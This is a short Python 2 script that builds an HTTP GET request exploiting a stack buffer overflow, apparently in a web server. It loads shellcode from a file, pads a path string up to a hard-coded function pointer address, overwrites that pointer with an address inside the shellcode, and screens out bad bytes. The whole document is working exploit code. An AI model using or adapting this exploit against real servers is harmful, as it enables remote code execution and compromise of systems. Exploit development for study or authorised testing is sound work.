#!/usr/bin/python
import urllib
import struct

stack_buffer = 0xbfffda0b
funcpointer = 0xbfffddfc

def build_exploit():
    shellfile = open("shellcode-iny3.bin", "r")
    shellcode = shellfile.read()

    preff = "/home/httpd/grades.txta"
    direcc = preff + shellcode
    shelloffset = len(preff)

    for x in xrange(0, funcpointer - stack_buffer - len(direcc)  ):
        direcc += "a"
    direcc += urllib.quote( struct.pack( "<I", shelloffset+stack_buffer ) )

    for x in direcc:
        if ( x=='\0' or  x=='\n' or x=='\r'):
            print("algo anda mal")
            exit()

    req =   "GET " + direcc + " HTTP/1.0\r\n" + \
            "\r\n"
    return req

